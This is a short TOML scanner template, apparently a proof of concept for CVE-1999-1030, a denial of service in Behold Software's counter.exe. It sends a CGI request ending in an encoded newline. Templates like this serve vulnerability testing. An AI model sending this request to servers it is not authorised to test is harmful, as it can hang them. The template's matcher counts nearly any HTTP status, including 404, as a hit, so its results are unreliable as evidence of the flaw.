[info]
author = "ave"
description = "Behold Software Web Page Counter 2.70 的 counter.exe 在处理以 %0A（换行符）结尾的 HTTP 请求时，会在计数器日志中写入畸形条目并触发访问违反，导致程序 hang 死锁。本 PoC 通过向 counter.exe 发送以换行结尾的 HTTP 请求，验证目标是否出现拒绝服务（无响应或挂起）。"
id = "POC-AVE-1999-0885"
name = "CVE-1999-1030 counter.exe 拒绝服务 PoC"
severity = "medium"
tags = ["ave-1999-0885"]
vuln_id = [
    "CVE-1999-1030",
    "AVE-1999-0885",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/counter.exe%0A"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    301,
    302,
    307,
    401,
    403,
    404,
]
type = "status"
